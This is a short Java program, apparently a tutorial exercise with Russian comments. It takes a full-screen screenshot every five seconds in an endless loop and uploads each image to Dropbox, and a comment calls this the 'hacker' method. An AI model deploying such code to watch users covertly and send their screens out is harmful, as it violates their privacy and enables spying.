import com.dropbox.core.DbxException;
import com.dropbox.core.DbxRequestConfig;
import com.dropbox.core.v2.DbxClientV2;
import com.dropbox.core.v2.files.FileMetadata;

import java.awt.*;
import java.awt.image.BufferedImage;

import java.awt.Rectangle;
import java.awt.Robot;
import java.awt.Toolkit;


public class Main {

    private static final String ACCESS_TOKEN = "TOKEN";//я же не дурочка свой токен оставлять
    public static void main (String[] args) throws DbxException {

        // Create Dropbox client
        DbxRequestConfig config = DbxRequestConfig.newBuilder("dropbox/java-tutorial").build();
        DbxClientV2 client = new DbxClientV2(config, ACCESS_TOKEN);

        for (;;) {
            //делаем скриншот с помощью класса Robot
            Robot robot = null;
            try {
                robot = new Robot();
            } catch (AWTException e) {
                e.printStackTrace();
            }
            BufferedImage image = robot.createScreenCapture(new Rectangle(Toolkit.getDefaultToolkit().getScreenSize()));
            //вызов "хакерского" метода
            ScreenshotUploader uploader = new ScreenshotUploader(client, image);

            //стартуем поток, который берёт паузу в 5 сек
            uploader.start();
            try {
                Thread.sleep(5000);
            } catch (InterruptedException e) {
                e.printStackTrace();
            }
        }
    }
}
